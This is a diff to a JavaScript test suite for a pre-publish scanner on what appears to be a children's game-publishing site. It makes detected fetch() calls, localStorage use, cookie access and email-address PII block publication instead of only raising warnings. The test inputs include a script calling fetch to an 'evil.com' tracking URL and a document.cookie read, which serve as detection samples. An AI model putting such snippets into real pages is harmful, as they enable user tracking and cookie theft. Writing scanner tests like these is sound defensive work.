@@ -77,16 +77,20 @@ assert(scan2.safe === false, 'Inappropriate title blocked');
 assert(scan2.warnings.includes('inappropriate_content'), 'Reports inappropriate_content');
 
 const scan3 = prePublishScan('<html><body><script>fetch("https://evil.com/track")</script></body></html>');
-assert(scan3.warnings.includes('external_request'), 'Detects fetch()');
+assert(scan3.safe === false, 'Blocks fetch() — dangerous pattern');
+assert(scan3.warnings.includes('external_request'), 'Reports external_request warning');
 
 const scan4 = prePublishScan('<html><body><script>localStorage.setItem("x","y")</script></body></html>');
-assert(scan4.warnings.includes('browser_storage'), 'Detects localStorage');
+assert(scan4.safe === false, 'Blocks localStorage — dangerous pattern');
+assert(scan4.warnings.includes('browser_storage'), 'Reports browser_storage warning');
 
 const scan5 = prePublishScan('<html><body><script>document.cookie</script></body></html>');
-assert(scan5.warnings.includes('cookie_access'), 'Detects cookie access');
+assert(scan5.safe === false, 'Blocks cookie access — dangerous pattern');
+assert(scan5.warnings.includes('cookie_access'), 'Reports cookie_access warning');
 
 const scan6 = prePublishScan('<html><body><p>Contact me at kid@school.edu</p></body></html>');
-assert(scan6.warnings.some(w => w.startsWith('pii_detected')), 'Detects PII in published game');
+assert(scan6.safe === false, 'Blocks PII in published game');
+assert(scan6.warnings.some(w => w.startsWith('pii_detected')), 'Reports pii_detected warning');
 
 // ========== USERNAME FILTER ==========
 section('Username Filter');
